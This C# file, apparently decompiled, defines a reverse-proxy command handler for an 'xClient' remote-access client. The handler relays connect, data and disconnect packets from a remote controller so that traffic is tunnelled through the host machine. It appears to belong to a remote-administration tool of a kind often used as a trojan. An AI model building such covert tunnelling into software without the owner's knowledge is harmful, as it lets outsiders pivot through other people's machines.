using System;
using xClient.Core.Networking;
using xClient.Core.Packets;
using xClient.Core.ReverseProxy.Packets;

namespace xClient.Core.ReverseProxy;

public class ReverseProxyCommandHandler
{
	public static void HandleCommand(Client client, IPacket packet)
	{
		Type type = packet.GetType();
		if (type == typeof(ReverseProxyConnect))
		{
			client.ConnectReverseProxy((ReverseProxyConnect)packet);
		}
		else if (type == typeof(ReverseProxyData))
		{
			ReverseProxyData reverseProxyData = (ReverseProxyData)packet;
			client.GetReverseProxyByConnectionId(reverseProxyData.ConnectionId)?.SendToTargetServer(reverseProxyData.Data);
		}
		else if (type == typeof(ReverseProxyDisconnect))
		{
			ReverseProxyDisconnect reverseProxyDisconnect = (ReverseProxyDisconnect)packet;
			client.GetReverseProxyByConnectionId(reverseProxyDisconnect.ConnectionId)?.Disconnect();
		}
	}
}
